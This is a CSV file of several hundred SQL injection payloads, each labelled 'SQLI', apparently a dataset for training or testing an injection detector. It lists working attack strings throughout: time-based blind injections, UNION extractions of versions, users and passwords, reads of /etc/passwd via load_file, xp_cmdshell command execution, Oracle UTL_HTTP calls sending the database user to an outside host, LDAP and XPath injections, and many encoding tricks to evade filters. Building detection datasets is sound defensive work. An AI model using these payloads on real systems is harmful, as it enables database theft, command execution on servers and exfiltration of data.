payload,attack
" and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",SQLI
DBMS_LOCK.SLEEP(50);,SQLI
"AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--",SQLI
"1,'0');waitfor delay '0:0:50;--",SQLI
);waitfor delay'0:0:50';--,SQLI
);waitfor delay '0:0:50';--,SQLI
 and pg_sleep(50)--,SQLI
1) and pg_sleep(50)--,SQLI
"\"") and pg_sleep(50)--",SQLI
) and pg_sleep(50)--,SQLI
1)) and pg_sleep(50)--,SQLI
)) and pg_sleep(50)--,SQLI
)) and pg_sleep(50)--,SQLI
"\"")) or pg_sleep(50)--",SQLI
)) or pg_sleep(50)--,SQLI
 and pg_sleep(50)--,SQLI
1) and sleep(50)--,SQLI
"\"") and sleep(50)--",SQLI
) and sleep(50)--,SQLI
1)) and sleep(50)--,SQLI
)) and sleep(50)--,SQLI
)) and sleep(50)--,SQLI
"\"")) or sleep(50)--",SQLI
 or pg_sleep(50)--,SQLI
)) or sleep(50)--,SQLI
are @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),SQLI
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ,SQLI
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),SQLI
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),SQLI
 or 1=1,SQLI
 or 1=1 -- ,SQLI
x' AND userid IS NULL; -- ,SQLI
x' AND email IS NULL; -- ,SQLI
anything' OR 'x'='x,SQLI
x' AND 1=(SELECT COUNT(*) FROM tabname); -- ,SQLI
x' AND members.email IS NULL; -- ,SQLI
x' OR full_name LIKE '%Bob%,SQLI
23 OR 1=1,SQLI
; exec master..xp_cmdshell 'ping 172.10.1.255'-- ,SQLI
,SQLI
%20or%20''=',SQLI
%20or%20'x'='x,SQLI
%20or%20x=x,SQLI
)%20or%20('x'='x,SQLI
0 or 1=1,SQLI
 or 0=0 -- ,SQLI
""" or 0=0 -- ",SQLI
or 0=0 -- ,SQLI
 OR 1=1 LIMIT 1 #,SQLI
 or 0=0 #,SQLI
" or 0=0 #""",SQLI
or 0=0 #,SQLI
 or 1=1-- ,SQLI
""" or 1=1-- ",SQLI
 or '1'='1'-- ,SQLI
 or 1=1 --',SQLI
 or 1 --',SQLI
or 1=1-- ,SQLI
or%201=1,SQLI
or%201=1 -- ,SQLI
 or 1=1 or ''=',SQLI
" or 1=1 or """"=",SQLI
 or a=a-- ,SQLI
 or a=a,SQLI
) or ('a'='a,SQLI
) or (a=a,SQLI
hi or a=a,SQLI
"hi or 1=1 --""",SQLI
hi' or 1=1 -- ,SQLI
hi' or 'a'='a,SQLI
hi') or ('a'='a,SQLI
"""hi"""") or (""""a""""=""""a""",SQLI
hi' or 'x'='x';,SQLI
@variable,SQLI
",@variable",SQLI
PRINT,SQLI
PRINT @@variable,SQLI
 or username like '%,SQLI
 or uname like '%,SQLI
 or userid like '%,SQLI
 or uid like '%,SQLI
 or user like '%,SQLI
exec xp,SQLI
exec sp,SQLI
; exec master..xp_cmdshell,SQLI
; exec xp_regread,SQLI
t'exec master..xp_cmdshell 'nslookup www.google.com'-- ,SQLI
--sp_password,SQLI
\x27UNION SELECT,SQLI
 UNION SELECT,SQLI
 UNION ALL SELECT,SQLI
 or (EXISTS),SQLI
 (select top 1,SQLI
||UTL_HTTP.REQUEST,SQLI
1;SELECT%20*,SQLI
to_timestamp_tz,SQLI
tz_offset,SQLI
"<>""'%;)(&+",SQLI
%20or%201=1,SQLI
%27%20or%201=1,SQLI
%20$(sleep%2050),SQLI
%20'sleep%2050',SQLI
char%4039%41%2b%40SELECT,SQLI
&apos;%20OR,SQLI
%7C,SQLI
*|,SQLI
%2A%7C,SQLI
*(|(mail=*)),SQLI
%2A%28%7C%28mail%3D%2A%29%29,SQLI
*(|(objectclass=*)),SQLI
%2A%28%7C%28objectclass%3D%2A%29%29,SQLI
 or 1=1 or ''=',SQLI
 or ''=',SQLI
x' or 1=1 or 'x'='y,SQLI
a' or 3=3-- ,SQLI
"""a"""" or 3=3--""",SQLI
 or 3=3,SQLI
 or 3=3 -- ,SQLI
admin --,SQLI
x' AND 1=(SELECT COUNT(*) FROM tabname);--,SQLI
1+union+select+abc+from+abc,SQLI
"union select 1,load_file(0x2f6574632f706173737764),3 from users--",SQLI
"0^(locate(0x61,(select id from users where num=1),1)=1)",SQLI
x';INSERT+INTO+aa('1')+values('1')--,SQLI
x';UPDATE+aa+set+1='2'--,SQLI
"1+and+convert(int,@@servername)--",SQLI
a';exec+master..xp_cmdshell+'ping'--,SQLI
a';EXEC+master.dbo.xp_cmdshell+'ping',SQLI
";/*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ ""ping 127.0.0.1"" /*,1*/--",SQLI
";/*&iid=1*/ EXEC/*&iid=1*/ master..xp_cmdshell /*&iid=1*/ ""ping 127.0.0.1"" /*&iid=1*/--",SQLI
1+or+1=1--,SQLI
1+or+'ab'='ab1,SQLI
1'<99# ,SQLI
=0=1# ,SQLI
<=>0# ,SQLI
!=2!=3!=4# ,SQLI
|0# ,SQLI
&0# ,SQLI
^0# ,SQLI
+and+@@servername>1--,SQLI
+and+@@version>1--,SQLI
1'+HAVING 1=1--,SQLI
"(coalesce(length(load_file(0x2F6574632F706173737764)),1))",SQLI
"if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00",SQLI
"(1)rlike(if(mid(@@version,1,1)like(5),0x28,1))",SQLI
"1),(version(),1,1",SQLI
%20union%20/*!select*/%20/*!@@datadir*/,SQLI
"15+/*!union*/+/*!all*/+/*!select*/+1,2,3,4,5,6,7--",SQLI
"6+/*!UniOn*/+/*!AlL*/+/*!SeLecT*/+1,2,3,4,5,6,version()--",SQLI
1'+and+(select+pass+from+users+limit+1)='pass--,SQLI
123+uniOn+SeLEcT+BaNneR+FroM+v$vERsIon+WhERe+ROwNUm=1,SQLI
"nion/*aaa*/select/*aaa*/1,2,3",SQLI
"if(substring(USER(),1,4)=0x726f6f74,SLEEP(5),1)",SQLI
10+UNION+SELECT+LOAD_FILE(0x2f6574632f706173737764),SQLI
1'&&1='1,SQLI
=',SQLI
"+and+(select+substr(group_concat(pass),1,1)+from+users)='a",SQLI
"1%27%20union%20select%201,2,3--",SQLI
"123%2527%2520select%2520convert(int,@@servername)--",SQLI
53E%4c%45%43T%20%73%63h%65%6d%61%6ea%6de%20%46%52O%4d%20%70g%5f%74a%62%6ce%73,SQLI
1++union++select++abc++from++abc,SQLI
1%20%20union%20%20select%20%20abc%20%20from%20%20abc,SQLI
1%20%20%20%20union%20%20%20%20select%20%20%20%20abc%20%20%20%20from%20%20%20%20abc,SQLI
"1/*union*/union/*select*/select+1,2,3/*",SQLI
"1%2520union%2520select%25201,2,3/*",SQLI
"1%0Aunion%0Aselect%0A1,2,3/*",SQLI
1'OR'121'='121,SQLI
1'%0Cand%0C''=',SQLI
"1'%0Cunion%0Cselect%0C1,2,3",SQLI
1'%0Band%0B''=',SQLI
"1'%0Bunion%0Bselect%0B1,2,3",SQLI
1'%0Dand%0D''=',SQLI
"1'%0Dunion%0Dselect%0D1,2,3",SQLI
union(select(version())),SQLI
123/*!or*/1=1;,SQLI
"1'union/*!select*/pass,load_file(0x11)from+users--",SQLI
"1 and 9=8 /*!uNiOn*/ aLl /*!sElect*/ 1,2,3--",SQLI
"1/**/union%a0select/**/1,pass,3`a`from`users`",SQLI
"1+union+select+1,2,3/*",SQLI
"1+union+select+1,2,3--",SQLI
"1+union+select+1,2,3# ",SQLI
"1+union+select+1,2,3;%00",SQLI
1+len(@@servername)>1/*,SQLI
1+len(@@servername)>1--,SQLI
1+len(@@servername)>1# ,SQLI
1+len(@@servername)>1;%00,SQLI
); exec sp_executesql('W'+'ait'+'for'+' '+'de'+'lay'+' '+'00:00:40');--,SQLI
; EXEC ('SEL' + 'ECT US' + 'ER'),SQLI
; EXECUTE IMMEDIATE  'SEL' || 'ECT US' || 'ER',SQLI
;declare @x varchar(80); set @x = 0x73656c65637420404076657273696f6e; EXEC (@x),SQLI
;DECLARE+@S+NVARCHAR(200);SET+@S=CAST(0x73656c65637420404076657273696f6e+AS+NVARCHAR(200));EXEC(@S);,SQLI
1;declare+@myvar+nvarchar(80);set+@myvar=N'UNI'+N'ON%20SEL'+N'ECT%20U'+N'SER');EXEC(@myvar);,SQLI
"SET @c = CONCAT(b'01010011',b'01100101',b'01001100',b'01100101',b'01100011',b'01110100',' ',b'00110001');PREPARE s FROM @c;EXECUTE s;",SQLI
"SET @c = CONCAT(_latin1 b'01010011',_latin1 b'01100101',_latin1 b'01001100',_latin1 b'01100101',_latin1 b'01100011',_latin1 b'01110100',' ',_latin1 b'00110001');PREPARE s FROM @c;EXECUTE s;",SQLI
"SET @c = CONCAT(REPLACE(MAKE_SET(5,'SEL','xxxxx','ECT'), ',', ''),' 1');PREPARE s FROM @c;EXECUTE s;",SQLI
23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2C%28CASE%20WHEN%20%286349=6349%2F%2A%2150521%20AND%206349=6350%2A%2F%29%20THEN%201%20ELSE%200%20END%29%2C0x3a6270793a%29%23,SQLI
23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a6270793a%29%23,SQLI
23%EF%BC%87%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23,SQLI
23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23%00,SQLI
MTIzJyBMSU1JVCAxLDEgVU5JT04gQUxMIFNFTEVDVCBDT05DQVQoMHgzYTc1N2E3OTNhLElGTlVMTChDQVNUKHZlcnNpb24oKSBBUyBDSEFSKSwweDIwKSwweDNhNzM2YTc2M2EpIw==,SQLI
%27--iXhuMCk%0ALIMIT--MogMpTZGYi%0A1%2C1--TPjIJcnXAuX%0AUNION--llDCqlfYffk%0AALL--AtQHoRbN%0ASELECT--aaoghwWht%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28database%28%29--nXGeXoOEyHm%0AAS--tWKPbn%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23,SQLI
%31%32%33%27%20%4C%49%4D%49%54%20%31%2C%31%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%43%4F%4E%43%41%54%28%30%78%33%61%37%33%37%32%37%37%33%61%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%64%61%74%61%62%61%73%65%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%33%61%36%64%37%39%36%34%33%61%29%23,SQLI
23%27%23DDvIMgC%0ALIMIT%23wyQDiZxbEfWH%0A1%2C1%23vJHSbhW%0AUNION%23WfNzMdJBEP%0AALL%23AgDqJl%0ASELECT%23xRYClbEPoiuX%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28version%28%29%23BiJwsArZs%0AAS%23FgnwSFSQ%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23,SQLI
23%29%20AND%20%28SELECT%205524%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6864723a%2C%28SELECT%20%28CASE%20WHEN%20%285524%20LIKE%205524%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a7767793a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287619%20LIKE%207619,SQLI
23%29%20AND%202874%20LIKE%202341%20AND%20%288194%20LIKE%208194,SQLI
23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6864723a%2CIF%28ISNULL%28CAST%28version%28%29%20AS%20CHAR%29%29%2C0x20%2CCAST%28version%28%29%20AS%20CHAR%29%29%2C0x3a7767793a%29%23,SQLI
23%29%20%20AND%20%20%20%208558=8593%20%20AND%20%20%20%20%285473=5473,SQLI
223%29%20%20%20%20AND%20%20%20%20%208558=8593%20%20AND%20%20%20%20%20%20%285473=5473,SQLI
423%27%20%20%20%20LIMIT%20%20%201%2C1%20%20UNION%20%20%20%20%20ALL%20%20%20%20%20%20%20SELECT%20%20%20%20%20CONCAT%280x3a6d70663a%2C%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20CHAR%20%29%2C0x20%29%2C0x3a736e623a%29%23,SQLI
1##%1%2%3%%27%20%L%I%M%I%T%20%1%%2C%1%20%U%N%I%O%N%20%A%L%L%20%S%E%L%E%C%T%20%C%O%N%C%A%T%%28%0%x%3%a%6%d%7%0%6%6%3%a%%2C%I%F%N%U%L%L%%28%C%A%S%T%%28%d%a%t%a%b%a%s%e%%28%%29%20%A%S%20%C%H%A%R%%29%%2C%0%x%2%0%%29%%2C%0%x%3%a%7%3%6%e%6%2%3%a%%29%%23,SQLI
1%1%3%%27%+%A%N%D%+%1%=%1,SQLI
23%bf%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23--%20,SQLI
123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23%20and%20%270having%27=%270having%27,SQLI
223%29%20AND%201701=5451%20AND%20%283835=3835%20and%20%270having%27=%270having%27,SQLI
23%27%2BLIMIT%2B1%2C1%2BUNION%2BALL%2BSELECT%2BCONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%2BAS%2BCHAR%29%2C0x20%29%2C0x3a69626b3a%29%23,SQLI
-123%27%2F%2A%210LIMIT%201%2C1%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210CONCAT%280x3a6267653a%2C%2F%2A%210IFNULL%28CAST%28%2F%2A%210version%28%29%2F%2A%210AS%2F%2A%210CHAR%29%2C0x20%29%2C0x3a69626b3a%29%23,SQLI
-223%27%20%2F%2A%2130631LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a69626b3a%29%2A%2F%2,SQLI
323%29%20%2F%2A%2100000AND%203244=4853%20AND%20%286013=6013%2A%2F,SQLI
423%27%20%2F%2A%2100000LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a79757a3a%29%2A%2F%23,SQLI
523%27%2F%2A%21LIMIT%2A%2F1%2C1%2F%2A%21UNION%2A%2F%2F%2A%21ALL%2A%2F%2F%2A%21SELECT%2A%2F%2F%2A%21CONCAT%2A%2F%280x3a6a7a713a%2C%2F%2A%21IFNULL%2A%2F%28CAST%28%2F%2A%21database%2A%2F%28%29%2F%2A%21AS%2A%2F%2F%2A%21CHAR%2A%2F%29%2C0x20%29%2C0x3a79757a3a%29%23,SQLI
123%27%09LIMIT%0C1%2C1%0AUNION%04ALL%01SELECT%07CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%09AS%0BCHAR%29%2C0x20%29%2C0x3a79757a3a%29%23,SQLI
123%29%07AND%079869=8149%01AND%01%281045=1045,SQLI
1+and+1=1,SQLI
"1+and+100>(ASCII(Substring(user(),1,1)))",SQLI
"1+and+100>(Select+top+1+ASCII(Substring(name,1,1))) from sysusers)--",SQLI
"1 and 100>(Select ASCII(Substr(username,1,1))) from all_users where rownum<=1)",SQLI
"1 and substring(version(),1,1)=4",SQLI
+order+by+19--,SQLI
1+and+'123'='123,SQLI
1'+or+@@servername=@@servername--,SQLI
1+and+ascii('a')=97,SQLI
1+and+hex('a')=61,SQLI
1+and+ord('a') = 97,SQLI
1 and name=0x5265696E657273,SQLI
1+and+len(@@servername)>1--,SQLI
1+and+length(123)=3,SQLI
123+AND+md5('a')!= md5('A'),SQLI
and (select 1)=1,SQLI
123'+not+like+'1234,SQLI
aaa'<>'bbb',SQLI
"+or+round(pi(),1)+true+true = version()",SQLI
"+or+round(pi(),1)+true+true = version()",SQLI
+where+(0)=0,SQLI
+where 0 = 0,SQLI
"1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1))",SQLI
"1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74",SQLI
123%20or%20%c0%a7%c01%a71=%c0%a71,SQLI
123K29yKycxJz0nMQ==,SQLI
case when name=0x5265696E657273 then 1 else 0 end,SQLI
123+1+5-5-1,SQLI
123+len(1234)-len(123),SQLI
23+len(@@servername)-len(@@servername),SQLI
)+waitfor+delay+'0:0:5',SQLI
);waitfor+delay+'00:00:05',SQLI
;waitfor+delay+'00:00:05',SQLI
);waitfor+delay+'00:00:05'--,SQLI
);waitFor+Delay+'00:00:05',SQLI
waitfor+delay+'00:00:05',SQLI
)+waitfor+delay+'00:00:05',SQLI
+waitfor+delay+'00:00:05'--,SQLI
+waitfor+delay+'00:00:05',SQLI
+waitfor+delay+'00:00:05',SQLI
)+waitfor+time+'00:00:01',SQLI
;waitfor+delay+'0:0:5'--,SQLI
;waitfor+delay+'0:0:5'--,SQLI
"BENCHMARK(1000000000,MD5(CHAR(116)))",SQLI
"IF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1)",SQLI
" UNION SELECT IF(SUBSTRING(USER(),1,4)=0x726f6f74,BENCHMARK(100000000,RAND()),1)",SQLI
"+if(ASCII(SUBSTRING((),i, 1))>k,BENCHMARK(100000000, RAND()),1)",SQLI
%20AND%20SLEEP(10)=',SQLI
||UTL_HTTP.REQUEST('http://somehost/')||',SQLI
||utl_inaddr.get_host_name((select+user+from+dual)),SQLI
+or+1=utl_http.request('http://host/'||(select+user+from+dual))--,SQLI
admin' --  ,SQLI
admin' #  ,SQLI
admin'/*  ,SQLI
 or 1=1--  ,SQLI
 or 1=1#  ,SQLI
 or 1=1/*  ,SQLI
) or '1'='1--  ,SQLI
) or ('1'='1--,SQLI
 OR '1'='1' --,SQLI
 OR '1'='1' /*,SQLI
 OR '1'='1' #,SQLI
 OR '1'='1' %00,SQLI
 OR '1'='1' %16,SQLI
OR 1=1,SQLI
OR 1=0,SQLI
OR x=x,SQLI
OR x=y,SQLI
OR 1=1#,SQLI
OR 1=0#,SQLI
OR x=x#,SQLI
OR x=y#,SQLI
OR 1=1-- ,SQLI
OR 1=0-- ,SQLI
OR x=x-- ,SQLI
OR x=y-- ,SQLI
OR 3409=3409 AND ('pytW' LIKE 'pytW,SQLI
OR 3409=3409 AND ('pytW' LIKE 'pytY,SQLI
HAVING 1=1,SQLI
HAVING 1=0,SQLI
HAVING 1=1#,SQLI
HAVING 1=0#,SQLI
HAVING 1=1-- ,SQLI
HAVING 1=0-- ,SQLI
AND 1=1,SQLI
AND 1=0,SQLI
AND 1=1-- ,SQLI
AND 1=0-- ,SQLI
AND 1=1#,SQLI
AND 1=0#,SQLI
AND 1=1 AND '%'=',SQLI
AND 1=0 AND '%'=',SQLI
AND 1083=1083 AND (1427=1427,SQLI
AND 7506=9091 AND (5913=5913,SQLI
AND 1083=1083 AND ('1427=1427,SQLI
AND 7506=9091 AND ('5913=5913,SQLI
AND 7300=7300 AND 'pKlZ'='pKlZ,SQLI
AND 7300=7300 AND 'pKlZ'='pKlY,SQLI
AND 7300=7300 AND ('pKlZ'='pKlZ,SQLI
AND 7300=7300 AND ('pKlZ'='pKlY,SQLI
AS INJECTX WHERE 1=1 AND 1=1,SQLI
AS INJECTX WHERE 1=1 AND 1=0,SQLI
AS INJECTX WHERE 1=1 AND 1=1#,SQLI
AS INJECTX WHERE 1=1 AND 1=0#,SQLI
AS INJECTX WHERE 1=1 AND 1=1--,SQLI
AS INJECTX WHERE 1=1 AND 1=0--,SQLI
WHERE 1=1 AND 1=1,SQLI
WHERE 1=1 AND 1=0 ,SQLI
WHERE 1=1 AND 1=1#,SQLI
WHERE 1=1 AND 1=0#,SQLI
WHERE 1=1 AND 1=1--,SQLI
WHERE 1=1 AND 1=0--,SQLI
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',SQLI
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',SQLI
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,SQLI
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,SQLI
%' AND 8310=8310 AND '%'=',SQLI
%' AND 8310=8311 AND '%'=',SQLI
"and (select substring(@@version,1,1))='X'",SQLI
"and (select substring(@@version,1,1))='M'",SQLI
"and (select substring(@@version,2,1))='i'",SQLI
"and (select substring(@@version,2,1))='y'",SQLI
"and (select substring(@@version,3,1))='c'",SQLI
"and (select substring(@@version,3,1))='S'",SQLI
"and (select substring(@@version,3,1))='X'",SQLI
admin)(|(password=*),SQLI
admin)(%0a|(password=*),SQLI
%0a*{}%0abody{background:red}%0a/,SQLI
"*(select*from(select(name_const(version(),1)),name_const(version(),1))a)* '",SQLI
" or updatexml(1,concat(0x7e,(version())),0) or '",SQLI
1/*f*/oR/*f*/888/*f*/lIke/*f*/456,SQLI
1/*f*/oR/*f*/345/*f*/lIke/*f*/345,SQLI
1/*f*/||/*f*/888/*f*/lIke/*f*/456,SQLI
1/*f*/||/*f*/345/*f*/lIke/*f*/345,SQLI
827364827346%0a||%0a888%0alIke%0a456,SQLI
827364827346%0a||%0a345%0alIke%0a345,SQLI
456'||'0,SQLI
345'||'1,SQLI
456||0,SQLI
345||1,SQLI
a'or/*d*/888=456-- #,SQLI
a'or/*d*/345=345-- #,SQLI
a'or%0a888%0alIke%0a456-- #,SQLI
a'or%0a345%0alIke%0a345-- #,SQLI
a'||%0a888%0alIke%0a456-- #,SQLI
a'||%0a345%0alIke%0a345-- #,SQLI
2 and 456=678,SQLI
2 or 345=345,SQLI
2 order by 9999,SQLI
2 order by 1,SQLI
2/0 and 456=678,SQLI
2/1 or 345=345,SQLI
2/*f*/and/*f*/456=678,SQLI
2/*f*/or/*f*/345=345,SQLI
a' and '456'='678,SQLI
a' or '345'='345,SQLI
a' and 'fghi'='fghj'-- #,SQLI
a' or 'dfth'='dfth'-- #,SQLI
a' order by 9999-- #,SQLI
a' order by 1-- #,SQLI
a'and/*g*/456=678-- #,SQLI
a'or/*g*/345=345-- #,SQLI
a' and '456'='678,SQLI
a' or '345'='345,SQLI
a' and 'fghi'='fghj'#,SQLI
a' or 'dfth'='dfth'#,SQLI
a' order by 9999#,SQLI
a' order by 1#,SQLI
a'||/**/456=678#,SQLI
a'||/**/345=345#,SQLI
a' and '456'='678,SQLI
a' or '345'='345,SQLI
a' and 'fghi'='fghj'--,SQLI
a' or 'dfth'='dfth'--,SQLI
a' order by 9999--,SQLI
a' order by 1--,SQLI
a'and/*d*/456=678--,SQLI
a'or/*d*/345=345--,SQLI
a' and '456'='678,SQLI
a' or '345'='345,SQLI
a' and 'fghi'='fghj'-- #,SQLI
a' or 'dfth'='dfth'-- #,SQLI
a' order by 9999-- #,SQLI
a' order by 1-- #,SQLI
a'and/*g*/456=678-- #,SQLI
a'or/*g*/345=345-- #,SQLI
345'%5d|//*|/a%5b'a,SQLI
456'%5d|//a|/a%5b'a,SQLI
"345')%5d|//*|/a%5bcontains(a,'b",SQLI
"456')%5d|//a|/a%5bcontains(a,'b",SQLI
"a"" and ""456""=""678",SQLI
"a"" or ""345""=""345",SQLI
"a"" and ""fghi""=""fghj""-- #",SQLI
"a"" or ""dfth""=""dfth""-- #",SQLI
"a"" order by 9999-- #",SQLI
